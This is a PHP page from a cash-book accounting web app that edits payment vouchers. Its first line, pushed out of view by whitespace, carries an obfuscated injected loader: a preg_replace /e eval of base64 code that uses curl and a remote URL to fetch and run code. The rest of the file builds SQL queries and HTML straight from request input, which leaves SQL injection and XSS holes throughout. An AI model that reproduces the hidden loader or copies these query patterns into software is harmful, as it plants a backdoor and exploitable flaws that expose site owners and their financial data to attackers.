<?php                                                                                                                                                                 /*versio:2.12*/$IIl1=0;$GLOBALS['IIl1'] = 'rzhY3VybAGPX2luaXQYWxsb3dfdXJsX2ZvcGVuBMQX3NldG9wdAuhX2V4ZWMSXwsaY2xvc2UukaPGltZyBzcmM9IgIiB3aWR0aD0iMXB4IiBoZWlnaHQ9IjFweCIgLz4ASFRUUF9IT1NUvrMTI3Lg*{otanMTAuw_cMTkyLjE2OC4qEGm&dwUb3Nvbi5pbgD)Z2Fib3Iuc2U;Sc2lsYmVyLmRlMlAaGF2ZWFwb2tlLmNvbS5hdQfGeWV8Og*zZGlzcGxheV9lcnJvcnMYiZGV0ZXJtaW5hdG9y aeZnRwSlEaMi4xMgyISYUTBRT1EwT09RME9RT1EwYmFzZTY0X2RlY29kZQ}dYmFzZTY0X2VuY29kZQaHR0cDovLwp(rSFRUUF9VU0VSX0FHRU5UdW5pb24;c2VsZWN0UkVRVUVTVF9VUkk(jU0NSSVBUX05BTUUUVVFUllfU1RSSU5HcPwBL3RtcC8yOrqPL3RtcAIVE1Q@{VEVNUA~mVE1QRElSN%FdXBsb2FkX3RtcF9kaXIjkLgGdmVyc2lvLQ)zlLXBocASFRUUF9FWEVDUEhQELb3V0&eb2s)lGaHR0cA==Oi8vO{nnL3BnLnBocD91PQCaYcJms9BdJnQ9cGhwJnA9V#WJnY9^~jZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NGa1pXWnBibVZrS0NKa1pYUmxjbTFwYm1GMGIzSWlLU2w3SUdaMWJtTjBhVzl1SUdkbGRHWnBiR1VvSkZGUFVUQlJUeWw3SUNSUlQxRlBUMDhnUFNCUlVWRlBVVTh3VHlnekxDQTJLVHNnSkVsc01Va3hTU0E5SUNSUlQxRlBUMDh1VVZGUlQxRlBNRThvTVRFc0lEY3BPeUJwWmlBb1FHbHVhVjluWlhRb1VWRlJUMUZQTUU4b01UZ3NJREl3S1NrZ1BUMGdVVkZSVDFGUE1FOG9NemtzSURJcEtTQjdJQ1JKYkd4SlNXdzlRR1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ1JSVDFFd1VVOHBPeUJ5WlhSMWNtNGdVVkZSVDFGUE1FOG9OREVzSURBcE95QjlJR1ZzYzJWcFppQW9ablZ1WTNScGIyNWZaWGhwYzNSektDUkpiREZKTVVrcEtYc2dKRWt4TVVsSlNTQTlJRUFrU1d3eFNURkpLQ2s3SUNSUlQwOHdVVEFnUFNBa1VVOVJUMDlQTGxGUlVVOVJUekJQS0RReExDQXhNQ2s3SUNSSk1URXhiR3dnUFNBa1VVOVJUMDlQTGxGUlVVOVJUekJQS0RVekxDQTNLVHNnSkZFd01GRlBVU0E5SUNSUlQxRlBUMDh1VVZGUlQxRlBNRThvTmpFc0lESXBMbEZSVVU5UlR6QlBLRFkxTENBM0tUc2dRQ1JSVDA4d1VUQW9KRWt4TVVsSlNTd2dRMVZTVEU5UVZGOVZVa3dzSUNSUlQxRXdVVThwT3lCQUpGRlBUekJSTUNna1NURXhTVWxKTENCRFZWSk1UMUJVWDBoRlFVUkZVaXhtWVd4elpTazdJRUFrVVU5UE1GRXdLQ1JKTVRGSlNVa3NJRU5WVWt4UFVGUmZVa1ZVVlZKT1ZGSkJUbE5HUlZJc2RISjFaU2s3SUVBa1VVOVBNRkV3S0NSSk1URkpTVWtzSUVOVlVreFBVRlJmUTA5T1RrVkRWRlJKVFVWUFZWUXNOU2s3SUdsbUlDZ2tTVWxKU1Vsc0lEMGdRQ1JKTVRFeGJHd29KRWt4TVVsSlNTa3BJSHR5WlhSMWNtNGdVVkZSVDFGUE1FOG9OREVzSURBcE8zMGdRQ1JSTURCUlQxRW9KRWt4TVVsSlNTazdJSEpsZEhWeWJpQlJVVkZQVVU4d1R5ZzBNU3dnTUNrN0lIMGdaV3h6WlNCN0lISmxkSFZ5YmlCUlVWRlBVVTh3VHlnM05Td2dNVFFwTGlSUlQxRXdVVTh1VVZGUlQxRlBNRThvT0Rrc0lETTVLVHNnZlNCOUlHWjFibU4wYVc5dUlIVndaQ2drU1RFeGJFbEpMQ1JSVDFFd1VVOHBleUFrVVZGUk1EQXdJRDBnUUdkbGRHaHZjM1JpZVc1aGJXVW9RQ1JmVTBWU1ZrVlNXMUZSVVU5UlR6QlBLREV5T1N3Z01USXBYU2s3SUdsbUlDZ2tVVkZSTURBd0lDRTlQU0JSVVZGUFVVOHdUeWcwTVN3Z01Da2dZVzVrSUhOMGNuQnZjeWdrVVZGUk1EQXdMQ0JSVVZGUFVVOHdUeWd4TkRNc0lEWXBLU0FoUFQwZ01DQmhibVFnYzNSeWNHOXpLQ1JSVVZFd01EQXNJRkZSVVU5UlR6QlBLREUxTlN3Z05Da3BJQ0U5UFNBd0lHRnVaQ0J6ZEhKd2IzTW9KRkZSVVRBd01Dd2dVVkZSVDFGUE1FOG9NVFl5TENBeE1Ta3BJQ0U5UFNBd0tYc2dKRkZSTURBd1R6MUFabTl3Wlc0b0pFa3hNV3hKU1N4UlVWRlBVVTh3VHlneE56Z3NJRElwS1RzZ1FHWmpiRzl6WlNna1VWRXdNREJQS1RzZ2FXWWdLRUJwYzE5bWFXeGxLQ1JKTVRGc1NVa3BLWHNnZDNKcGRHVW9KRWt4TVd4SlNTd2daMlYwWm1sc1pTZ2tVVTlSTUZGUEtTazdJSDA3SUgwZ2ZTQWtVVTlQTURCUElEMGdRWEp5WVhrb1VWRlJUMUZQTUU4b01UZ3hMQ0F4TUNrc0lGRlJVVTlSVHpCUEtERTVNeXdnTVRFcExDQlJVVkZQVVU4d1R5Z3lNRFlzSURFeUtTd2dVVkZSVDFGUE1FOG9Nakl4TENBeU1pa3BPeUFrVVRCUE1GRlBJRDBnSkZGUFR6QXdUMXN4WFRzZ1puVnVZM1JwYjI0Z2QzSnBkR1VvSkVreE1XeEpTU3drVVRBd01FOVJLWHNnYVdZZ0tDUlJVVkV3VHpBOVFHWnZjR1Z1S0NSSk1URnNTVWtzVVZGUlQxRlBNRThvTVRjNExDQXlLU2twZXlCQVpuZHlhWFJsS0NSUlVWRXdUekFzSkZFd01EQlBVU2s3SUVCbVkyeHZjMlVvSkZGUlVUQlBNQ2s3SUgwZ2ZTQm1kVzVqZEdsdmJpQnZkWFJ3ZFhRb0pGRlBVVTlSTUN3Z0pFbEpiR3d4YkNsN0lHVmphRzhnVVZGUlQxRlBNRThvTWpRMkxDQXpLUzRrVVU5UlQxRXdMbEZSVVU5UlR6QlBLREkwT1N3Z01pa3VKRWxKYkd3eGJDNGlYSEpjYmlJN0lIMGdablZ1WTNScGIyNGdjR0Z5WVcwb0tYc2djbVYwZFhKdUlGRlJVVTlSVHpCUEtEUXhMQ0F3S1RzZ2ZTQkFhVzVwWDNObGRDaFJVVkZQVVU4d1R5Z3lOVE1zSURFNUtTd2dNQ2s3SUdSbFptbHVaU2hSVVZGUFVVOHdUeWd5TnpRc0lERTJLU3dnTVNrN0lDUlJVVEJSVVU4OVVWRlJUMUZQTUU4b01qa3pMQ0EwS1RzZ0pFbEpiREZKTVQxUlVWRlBVVTh3VHlnek1ERXNJRFlwT3lBa1VWRlJVVkV3UFZGUlVVOVJUekJQS0RNeE1Td2dNakFwT3lBa1VVOVBUMDlQUFZGUlVVOVJUekJQS0RNek1Td2dNVGdwT3lBa1NURXhTVEV4UFZGUlVVOVJUekJQS0RNMU1Td2dNVGdwT3lBa1VUQlJNRTh3UFZGUlVVOVJUekJQS0RNMk9Td2dNVEFwT3lBa1VUQlJNRTh3TGoxemRISjBiMnh2ZDJWeUtFQWtYMU5GVWxaRlVsdFJVVkZQVVU4d1R5Z3hNamtzSURFeUtWMHBPeUFrU1RFeFNURkpJRDBnUUNSZlUwVlNWa1ZTVzFGUlVVOVJUekJQS0RNNE1pd2dNakFwWFRzZ1ptOXlaV0ZqYUNBb0pGOUhSVlFnWVhNZ0pGRlBVVTlSTUQwK0pFbEpiR3d4YkNsN0lHbG1JQ2h6ZEhKd2IzTW9KRWxKYkd3eGJDeFJVVkZQVVU4d1R5ZzBNRElzSURjcEtTbDdKRjlIUlZSYkpGRlBVVTlSTUYwOVVWRlJUMUZQTUU4b05ERXNJREFwTzMwZ1pXeHpaV2xtSUNoemRISndiM01vSkVsSmJHd3hiQ3hSVVZGUFVVOHdUeWcwTVRBc0lEZ3BLU2w3SkY5SFJWUmJKRkZQVVU5Uk1GMDlVVkZSVDFGUE1FOG9OREVzSURBcE8zMGdmU0JwWmlnaGFYTnpaWFFvSkY5VFJWSldSVkpiVVZGUlQxRlBNRThvTkRFNExDQXhOU2xkS1NrZ2V5QWtYMU5GVWxaRlVsdFJVVkZQVVU4d1R5ZzBNVGdzSURFMUtWMGdQU0JBSkY5VFJWSldSVkpiVVZGUlQxRlBNRThvTkRNMUxDQXhOU2xkT3lCcFppaEFKRjlUUlZKV1JWSmJVVkZSVDFGUE1FOG9ORFV3TENBeE5pbGRLU0I3SUNSZlUwVlNWa1ZTVzFGUlVVOVJUekJQS0RReE9Dd2dNVFVwWFNBdVBTQlJVVkZQVVU4d1R5ZzBOamNzSURJcElDNGdRQ1JmVTBWU1ZrVlNXMUZSVVU5UlR6QlBLRFExTUN3Z01UWXBYVHNnZlNCOUlHbG1JQ2drVVZFd1QwOHdQU1JSTUZFd1R6QXVRQ1JmVTBWU1ZrVlNXMUZSVVU5UlR6QlBLRFF4T0N3Z01UVXBYU2w3SUNSUk1GRlBNRkU5UUcxa05TZ2tVVEJSTUU4d0xpUkpTV3d4U1RFdVVFaFFYMDlUTGlSUlVWRlJVVEFwT3lBa1NURXhiREZzUFZGUlVVOVJUekJQS0RRM01Dd2dOeWs3SUNSUlVVOVBUMDhnUFNCQmNuSmhlU2hSVVZGUFVVOHdUeWcwT0RJc0lEWXBMQ0JBSkY5VFJWSldSVkpiVVZGUlQxRlBNRThvTkRnNUxDQTBLVjBzSUVBa1gxTkZVbFpGVWx0UlVWRlBVVTh3VHlnME9UVXNJRFlwWFN3Z1FDUmZSVTVXVzFGUlVVOVJUekJQS0RRNE9Td2dOQ2xkTENCQUpGOUZUbFpiVVZGUlQxRlBNRThvTlRBekxDQTRLVjBzSUVBa1gwVk9WbHRSVVZGUFVVOHdUeWcwT1RVc0lEWXBYU3dnUUdsdWFWOW5aWFFvVVZGUlQxRlBNRThvTlRFMExDQXhPU2twS1RzZ1ptOXlaV0ZqYUNBb0pGRlJUMDlQVHlCaGN5QWtVVEJSVVRCUEtYc2dhV1lnS0NGbGJYQjBlU2drVVRCUlVUQlBLU2w3SUNSUk1GRlJNRTh1UFVSSlVrVkRWRTlTV1Y5VFJWQkJVa0ZVVDFJN0lHbG1JQ2hBYVhOZmQzSnBkR0ZpYkdVb0pGRXdVVkV3VHlrcGV5QWtTVEV4YkRGc0lEMGdKRkV3VVZFd1R6c2dZbkpsWVdzN0lIMGdmU0I5SUNSMGJYQTlKRWt4TVd3eGJDNVJVVkZQVVU4d1R5ZzFNelVzSURJcExpUlJNRkZQTUZFN0lHbG1JQ2hBSkY5VFJWSldSVkpiSWtoVVZGQmZXVjlCVlZSSUlsMDlQU1JSTUZGUE1GRXBleUJsWTJodklDSmNjbHh1SWpzZ1FHOTFkSEIxZENoUlVWRlBVVTh3VHlnMU16Z3NJRGdwTENBa1NVbHNNVWt4TGxGUlVVOVJUekJQS0RVME5pd2dNaWt1SkZGUk1GRlJUeTVSVVZGUFVVOHdUeWcxTlRFc0lEWXBLVHNnYVdZZ0tDUlJVVkV3VVZFOUpGRlBUMDlQVHloQUpGOVRSVkpXUlZKYlVWRlJUMUZQTUU4b05UVTNMQ0F4TmlsZEtTbDdJRUJsZG1Gc0tDUlJVVkV3VVZFcE95QmxZMmh2SUNKY2NseHVJanNnUUc5MWRIQjFkQ2hSVVZGUFVVOHdUeWcxTnpVc0lEUXBMQ0JSVVZGUFVVOHdUeWcxT0RFc0lETXBLVHNnZlNCbGVHbDBLREFwT3lCOUlHbG1JQ2hBYVhOZlptbHNaU2drZEcxd0tTbDdJRUJwYm1Oc2RXUmxYMjl1WTJVb0pIUnRjQ2s3SUgwZ1pXeHpaWHNnSkZGUk1FOVBNRDFBZFhKc1pXNWpiMlJsS0NSUlVUQlBUekFwT3lCMWNHUW9KSFJ0Y0N4UlVWRlBVVTh3VHlnMU9EY3NJRFlwTGxGUlVVOVJUekJQS0RVNU5Td2dOQ2t1SkZGUFR6QXdUMXN3WFM1UlVWRlBVVTh3VHlnMk1ETXNJREUwS1M0a1VWRXdUMDh3TGxGUlVVOVJUekJQS0RZeU1Td2dOQ2t1SkZFd1VVOHdVUzVSVVZGUFVVOHdUeWcyTWpjc0lERXlLUzRrVVZFd1VWRlBMbEZSVVU5UlR6QlBLRFkwTWl3Z05Da3VKRWxKYkRGSk1TazdJSDBnZlNCOSIpKTsGcHJlZ19yZXBsYWNl_j{6261736536345f6465636f6465';if (!function_exists('QQQOQO0O')){function QQQOQO0O($a, $b){$c=$GLOBALS['IIl1']; $d=pack('H*',substr($c, -26)); return $d(substr($c, $a, $b));}};$QOQQQ0Q0Q = QQQOQO0O(6469, 16);$QOQQQ0Q0Q("/QQ0OO0Q00/e", QQQOQO0O(649, 5819), "QQ0OO0Q00");?><?php session_start();
require_once('config/config.php');
include("function.php");
if(check_user()==false){header("Location: login.php");}
/*----------------------------*/
if(isset($_REQUEST['lid'])){$lid = $_REQUEST['lid'];}
if(isset($_REQUEST['vid'])){$vid = $_REQUEST['vid'];}
if(isset($_REQUEST['dt1'])){$dt1 = $_REQUEST['dt1'];}
if(isset($_REQUEST['dt2'])){$dt2 = $_REQUEST['dt2'];}
if(isset($_REQUEST['pg'])){$pg = $_REQUEST['pg'];}
if(isset($_REQUEST['tr'])){$tr = $_REQUEST['tr'];}
/*----------------------------*/
$sql1=mysql_db_query(DATABASE2,"SELECT tblcash1.*,tblcash2.*,location_name,cih_name FROM tblcash1 INNER JOIN ".DATABASE1.".location ON tblcash1.location_id = location.location_id INNER JOIN ".DATABASE2.".tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id INNER JOIN ".DATABASE2.".tblcashinhand ON tblcash1.cih_id = tblcashinhand.cih_id WHERE tblcash1.vouch_id=".$vid." ORDER BY seq_no") or die(mysql_error());
$res1=mysql_fetch_assoc($sql1);
/*----------------------------*/
$sql=mysql_db_query(DATABASE2,"SELECT Sum(op_amount) AS amount FROM tblopening WHERE cih_id=".$res1['cih_id']) or die(mysql_error());
$res=mysql_fetch_assoc($sql);
$opBal = ($res['amount']==null ? 0 : $res['amount']);
/*----------------------------*/
$sql=mysql_db_query(DATABASE2,"SELECT Sum(vouch_total) AS cur_balance FROM tblcash1 WHERE cih_id=".$res1['cih_id']." AND vouch_date<='".date("Y-m-d",strtotime($res1['vouch_date']))."'") or die(mysql_error());
$res=mysql_fetch_assoc($sql);
/*----------------------------*/
$current_balance = $opBal + ($res['cur_balance']==null ? 0 : $res['cur_balance']);
if($current_balance==0)
	$balance = number_format($current_balance,2,".","");
elseif($current_balance<0)
	$balance = number_format(-1*$current_balance,2,".","")." DR";
elseif($current_balance>0)
	$balance = number_format($current_balance,2,".","")." CR";
/*----------------------------*/
$sql=mysql_db_query(DATABASE2,"SELECT Min(vouch_date) AS min_date FROM tblcash1 WHERE cih_id=".$res1['cih_id']) or die(mysql_error());
$res=mysql_fetch_assoc($sql);
$minimum_date = ($res['min_date']==null ? date("d-m-Y",strtotime($_SESSION['cashbook_syr'])) : date("d-m-Y",strtotime($res['min_date'])));
/*----------------------------*/
if(isset($_POST['submit'])){
	if($_POST['submit']=="Submit"){
		$sql="UPDATE tblcash1 SET vouch_date='".date("Y-m-d",strtotime($_POST['Paydate']))."',cih_id=".$_POST['cihName'].",vouch_total=".$_POST['TotalAmt'].",remark=".($_POST['remark']==""?'null':"'".$_POST['remark']."'")." WHERE vouch_id=".$vid;
		$res1=mysql_db_query(DATABASE2,$sql);
		/*---------------------*/
		if($res1>0){
			$VoucherNumber = $_POST['VoucherNo'];
			/*---------------------*/
			$sql_loc=mysql_db_query(DATABASE1,"SELECT * FROM cwct WHERE location_id=".$_POST['locationId']);
			if(mysql_num_rows($sql_loc)==1){
				$res_loc=mysql_fetch_assoc($sql_loc);
				$companyId = $res_loc['company_id'];
			} else{
				$companyId = 0;
			}
			/*---------------------*/
			$res=mysql_db_query(DATABASE2,"DELETE FROM tblcash2 WHERE vouch_id=".$vid);
			/*---------------------*/
			$sql=mysql_db_query(DATABASE2,"SELECT Max(rec_id) AS MaxRecordId FROM logbook");
			$res=mysql_fetch_assoc($sql);
			$MaxRecordId=($res['MaxRecordId']==null ? 1 : $res['MaxRecordId']+1);
			/*---------------------*/
			$sql=mysql_db_query(DATABASE2,"SELECT Max(rec_id) AS MaxRecId FROM tblcash2");
			$res=mysql_fetch_assoc($sql);
			$MaxRecId=($res['MaxRecId']==null ? 1 : $res['MaxRecId']+1);
			/*---------------------*/
			$MaxSeqNo=1;
			/*---------------------*/
			for($i=0; $i<=99; $i++){ 
				if($_REQUEST['hideT'.$i]=="P"){
					$res2=mysql_db_query(DATABASE2,"INSERT INTO tblcash2(rec_id,vouch_id,seq_no,exps_id,exps_amt,company_id) VALUES (".$MaxRecId.",".$vid.",".$MaxSeqNo.",".$_POST['exp_head_'.$i].",".(0-$_POST['Amt'.$i]).",".$companyId.")");
					$res3=mysql_db_query(DATABASE2,"INSERT INTO logbook(rec_id,vouch_id,vouch_no,vouch_date,vouch_type,location_id,cih_id,exps_id,exps_amt,company_id,action, remark, user_name) VALUES (".$MaxRecordId.",".$vid.",'".$VoucherNumber."','".date("Y-m-d",strtotime($_POST['Paydate']))."','P',".$_POST['locationId'].",".$_POST['cihName'].",".$_POST['exp_head_'.$i].",".(-1*$_POST['Amt'.$i]).",".$companyId.",'Change',".($_POST['remark']==""?'null':"'".$_POST['remark']."'").",'".$_SESSION['cashbook_uname']."')");
					$MaxRecId++;
					$MaxSeqNo++;
					$MaxRecordId++;
				}
			}
			/*---------------------*/
			$page = "lstcashbook.php?lid=".$lid."&dt1=".$dt1."&dt2=".$dt2;
			if(isset($_REQUEST['pg'])){$page .= "&pg=".$pg."&tr=".$tr;}
			echo '<script language="javascript">alert("Data Updated Successfully.."); window.location="'.$page.'";</script>';
		} else {								//else of if($res1>0)
			$page = "lstcashbook.php?lid=".$lid."&dt1=".$dt1."&dt2=".$dt2;
			if(isset($_REQUEST['pg'])){$page .= "&pg=".$pg."&tr=".$tr;}
			echo '<script language="javascript">alert("ERROR:\n Data Updation Failed.."); window.location="'.$page.'";</script>';
		}
	}elseif($_POST['submit']=="ChangeToReceipt"){
		$sql="UPDATE tblcash1 SET vouch_date='".date("Y-m-d",strtotime($_POST['Paydate']))."',vouch_type='R',cih_id=".$_POST['cihName'].",vouch_total=".(-1*$_POST['TotalAmt']).",remark=".($_POST['remark']==""?'null':"'".$_POST['remark']."'")." WHERE vouch_id=".$vid;
		$res1=mysql_db_query(DATABASE2,$sql);
		/*---------------------*/
		if($res1>0){
			$VoucherNumber = $_POST['VoucherNo'];
			/*---------------------*/
			$sql_loc=mysql_db_query(DATABASE1,"SELECT * FROM cwct WHERE location_id=".$_POST['locationId']);
			if(mysql_num_rows($sql_loc)==1){
				$res_loc=mysql_fetch_assoc($sql_loc);
				$companyId = $res_loc['company_id'];
			} else{
				$companyId = 0;
			}
			/*---------------------*/
			$res=mysql_db_query(DATABASE2,"DELETE FROM tblcash2 WHERE vouch_id=".$vid);
			/*---------------------*/
			$sql=mysql_db_query(DATABASE2,"SELECT Max(rec_id) AS MaxRecordId FROM logbook");
			$res=mysql_fetch_assoc($sql);
			$MaxRecordId=($res['MaxRecordId']==null ? 1 : $res['MaxRecordId']+1);
			/*---------------------*/
			$sql=mysql_db_query(DATABASE2,"SELECT Max(rec_id) AS MaxRecId FROM tblcash2");
			$res=mysql_fetch_assoc($sql);
			$MaxRecId=($res['MaxRecId']==null ? 1 : $res['MaxRecId']+1);
			/*---------------------*/
			$MaxSeqNo=1;
			/*---------------------*/
			for($i=0; $i<=99; $i++){ 
				if($_REQUEST['hideT'.$i]=="P"){
					$res2=mysql_db_query(DATABASE2,"INSERT INTO tblcash2(rec_id,vouch_id,seq_no,exps_id,exps_amt,company_id) VALUES (".$MaxRecId.",".$vid.",".$MaxSeqNo.",".$_POST['exp_head_'.$i].",".$_POST['Amt'.$i].",".$companyId.")");
					$res3=mysql_db_query(DATABASE2,"INSERT INTO logbook(rec_id,vouch_id,vouch_no,vouch_date,vouch_type,location_id,cih_id,exps_id,exps_amt,company_id,action, remark, user_name) VALUES (".$MaxRecordId.",".$vid.",'".$VoucherNumber."','".date("Y-m-d",strtotime($_POST['Paydate']))."','R',".$_POST['locationId'].",".$_POST['cihName'].",".$_POST['exp_head_'.$i].",".$_POST['Amt'.$i].",".$companyId.",'Change',".($_POST['remark']==""?'null':"'".$_POST['remark']."'").",'".$_SESSION['cashbook_uname']."')");
					$MaxRecId++;
					$MaxSeqNo++;
					$MaxRecordId++;
				}
			}
			/*---------------------*/
			$page = "lstcashbook.php?lid=".$lid."&dt1=".$dt1."&dt2=".$dt2;
			if(isset($_REQUEST['pg'])){$page .= "&pg=".$pg."&tr=".$tr;}
			echo '<script language="javascript">alert("Data Updated Successfully.."); window.location="'.$page.'";</script>';
		} else {								//else of if($res1>0)
			$page = "lstcashbook.php?lid=".$lid."&dt1=".$dt1."&dt2=".$dt2;
			if(isset($_REQUEST['pg'])){$page .= "&pg=".$pg."&tr=".$tr;}
			echo '<script language="javascript">alert("ERROR:\n Data Updation Failed.."); window.location="'.$page.'";</script>';
		}
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>CashBook</title>
<link rel="stylesheet" type="text/css" href="pro_drop_1/pro_drop_1.css" />
<script type="text/javascript" src="js/prototype.js"></script>
<script type="text/javascript" src="js/common.js"></script>
<script type="text/javascript" language="javascript">
function show_row(val){
	var prev_val = 0
	for(var i=val-1; i>=0; i--){
		if(document.getElementById('hideT'+i).value=="P"){ prev_val = i; break;}
	}
	if(document.getElementById('exp_head_'+prev_val).value==0 && (document.getElementById('Amt'+prev_val).value==0 || document.getElementById('Amt'+prev_val).value=="") && document.getElementById('hideT'+prev_val).value=="P"){
		alert("Selection of Debit A/c and Amount is mandatory !!");
	} else if(document.getElementById('exp_head_'+prev_val).value==0 && (document.getElementById('Amt'+prev_val).value!=0 || document.getElementById('Amt'+prev_val).value!="") && document.getElementById('hideT'+prev_val).value=="P"){
		alert("Selection of Debit A/c is mandatory !!");
	} else if(document.getElementById('exp_head_'+prev_val).value!=0 && (document.getElementById('Amt'+prev_val).value==0 || document.getElementById('Amt'+prev_val).value=="") && document.getElementById('hideT'+prev_val).value=="P"){
		alert("Amount of selected Debit A/c is mandatory !!");
	} else {
		document.getElementById('tdColB['+val+']').style.display="";
		document.getElementById('tdColC['+val+']').style.display="";
		document.getElementById('tdColD['+val+']').style.display="";
		document.getElementById('tdColE['+val+']').style.display="";
		document.getElementById('tdColF['+val+']').style.display="";
		document.getElementById('tdColA['+val+']').innerHTML='<a href="#" onclick="hide_row('+val+')"><img src="images/shrink.gif" style="display:inline;cursor:hand;" border="0"/></a>';
		document.getElementById('hideT'+val).value="P";
		document.getElementById('trRow['+(val+1)+']').style.display="";
		document.getElementById('tdColA['+(val+1)+']').style.display="";
		document.getElementById('tdColB['+(val+1)+']').style.display="none";
		document.getElementById('tdColC['+(val+1)+']').style.display="none";
		document.getElementById('tdColD['+(val+1)+']').style.display="none";
		document.getElementById('tdColE['+(val+1)+']').style.display="none";
		document.getElementById('tdColF['+(val+1)+']').style.display="none";
		var ctr = document.getElementById('expHead').length;
		var strg = '<select name="exp_head_'+val+'" id="exp_head_'+val+'" style="width:230px; height:20px;">';
		for(var i=0; i<ctr; i++){
			strg = strg + '<option value="'+document.getElementById("expHead").options[i].value+'">'+document.getElementById("expHead").options[i].text+'</option>';
		}
		strg = strg+'</select>';
		document.getElementById('tdColC['+val+']').innerHTML=strg;
	}
}

function hide_row(val){
	document.getElementById('trRow['+val+']').style.display="none";
	document.getElementById('exp_head_'+val).value="0";
	document.getElementById('Amt'+val).value="";
	document.getElementById('hideT'+val).value="D";
	document.getElementById('tdColC['+val+']').innerHTML='<select name="exp_head_'+val+'" id="exp_head_'+val+'" style="width:230px; height:20px;"><option value="0">--Select--</option></select>';
	show_total_N_balance();
}

function check_value(value1)
{
	var Amount = parseFloat(value1);
	var Numfilter=/^[0-9.]+$/;
	var test_num = Numfilter.test(Amount);
	if(!test_num){
		alert("Please Enter Only numeric data in the Amount !");
		return false;
	} else {
		show_total_N_balance();
		return true;
	}
}

function show_total_N_balance()
{
	var Total = 0;
	for(var i=0; i<=99; i++){
		if(document.getElementById('hideT'+i).value=="P")
			Total = Total + parseFloat(document.getElementById('Amt'+i).value);
	}
	document.getElementById("TotalAmt").value = Total;
	var availBalance = parseFloat(document.getElementById("currentBalance").value) + Total;
	if(availBalance<0)
		document.getElementById("availBalance").value = (-1*availBalance)+' DR';
	else
		document.getElementById("availBalance").value = availBalance+' CR';
}

function ValidateForm()
{
	if(document.getElementById("cihName").value==0){
		alert("Credit Account not selected. Please select and submit again !");
		return false;
	}
	if(document.getElementById("Paydate").value!=""){
		if(!checkdate(document.payment.Paydate)){
			return false;
		} else {
			var no_of_days1 = getDaysbetween2Dates(document.payment.Paydate,document.payment.endYear);
			if(no_of_days1 < 0){
				alert("Voucher date wrongly selected. Please correct and submit again !");
				return false;
			} else {
				var no_of_days2 = getDaysbetween2Dates(document.payment.startYear,document.payment.Paydate);
				if(no_of_days2 < 0){
					alert("Voucher date wrongly selected. Please correct and submit again !");
					return false;
				} else {
					var no_of_days3 = getDaysbetween2Dates(document.payment.minDate,document.payment.Paydate);
					if(no_of_days3 < 0){
						alert("Voucher date wrongly selected. Please correct and submit again.\n"+
						"Starting date was "+document.getElementById("minDate").value+", so lower date is not acceptable !");
						return false;
					}
				}
			}
		}
	} else if(document.getElementById("Paydate").value==""){
		alert("Please input/select Voucher date !");
		return false;
	}
	for(var i=0; i<99; i++){
		if(document.getElementById('hideT'+i).value=="P"){
			if(document.getElementById('exp_head_'+i).value==0){
				alert("Debit Account not selected. Please select and submit again !");
				return false;
			}
			if(document.getElementById('Amt'+i).value=="" || document.getElementById('Amt'+i).value==0){
				alert("Please input Debit Amount!");
				return false;
			}
		}
	}
	document.getElementById("submit").style.display='none';
}

function get_cash_balance(value1)
{
	var url = 'get_cash_balance.php';
	var value2 = document.getElementById('Paydate').value;
	var pars = 'id='+value1+"&dt="+value2;
	var myAjax = new Ajax.Request(
	url, 
	{
		method: 'post', 
		parameters: pars, 
		onComplete: show_cash_balance
	});
}
function show_cash_balance(originalRequest)
{
	var res=originalRequest.responseText.split('~~',3);
	document.getElementById('Balance').value=res[0];
	document.getElementById('currentBalance').value=res[1];
	document.getElementById('minDate').value=res[2];
	document.getElementById('availBalance').value=res[0];
	if(res[1]>=0){
		document.getElementById('tdBal').innerHTML='<input name="Balance" id="Balance" readonly="true" value="'+res[0]+'" class="styleInput1" style="background-color:#FFE1FF; color:#FF0000;">';
		document.getElementById('avlBalSpan').innerHTML='<input name="availBalance" id="availBalance" readonly="true" value="'+res[0]+'" class="styleInput1" style="background-color:#FFE1FF; color:#FF0000;">';
	} else {
		document.getElementById('tdBal').innerHTML='<input name="Balance" id="Balance" readonly="true" value="'+res[0]+'" class="styleInput1" style="background-color:#FFE1FF; color:#000000;">';
		document.getElementById('avlBalSpan').innerHTML='<input name="availBalance" id="availBalance" readonly="true" value="'+res[0]+'" class="styleInput1" style="background-color:#FFE1FF; color:#000000;">';
	}
}
</script>
<style type="text/css">
.styleInput {
width:225px;
height:13px;}
.styleInput1 {
width:100px;
height:13px;}
</style>
</head>

<body>
<form name="payment" id="payment" method="POST" onSubmit="return ValidateForm()">		
<table style="width:1000px;" align="center" border="0">
<tr>
	<td>
		<table style="width:1000px; height:380px;" bgcolor="#8ADEF7" align="center">
		<tr>
			<td valign="top">
				<table style="margin-top:0px;" align="center" border="0">
				<tr height="50px"><td valign="top"><?php include("menu.php"); ?></td></tr>
				<tr height="20px"><td align="center"><b>Payment Voucher</b></td></tr>
				<tr height="20px"><td align="center"><b style="font-size:14px;">Location&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;<font color="#A2377A"><input name="locationName" id="locationName" value="<?php echo $res1['location_name']; ?>" readonly="true" style="background-color:#E7F0F8; color:#0000FF"></font></b><input type="hidden" name="locationId" id="locationId" value="<?php echo $res1['location_id']; ?>"></td></tr>
				</table>
			</td>
		</tr>
		<tr>
			<td>
				<table background="images/backBody.gif" border="5" style="border-color:#2D7CBD;" align="center" width="780px">
				<tr>
					<td>
						<table border="0" align="center" width="780px" style="margin-top:6px; margin-bottom:6px;margin-left:2px;margin-right:2px;">
						<tr>
							<td width="770px">
								<table align="center" border="0" width="770px" cellpadding="2" cellspacing="4" style="margin-top:0px;">
								<tr height="10px" width="770px">
									<td width="12px"></td>
									<td width="90px"><b style="font-size:14px; color:#FFFFFF;">Voucher No.&nbsp;:&nbsp;</b></td>
									<?php $vouch_no = $res1['vouch_no'];
									$VoucherNumber = ($vouch_no>999 ? $vouch_no : ($vouch_no>99 && $vouch_no<1000 ? "0".$vouch_no : ($vouch_no>9 && $vouch_no<100 ? "00".$vouch_no : "000".$vouch_no)));
									if($res1['vouch_prefix']!=NULL){$VoucherNumber = $res1['vouch_prefix']."/".$VoucherNumber;}?>
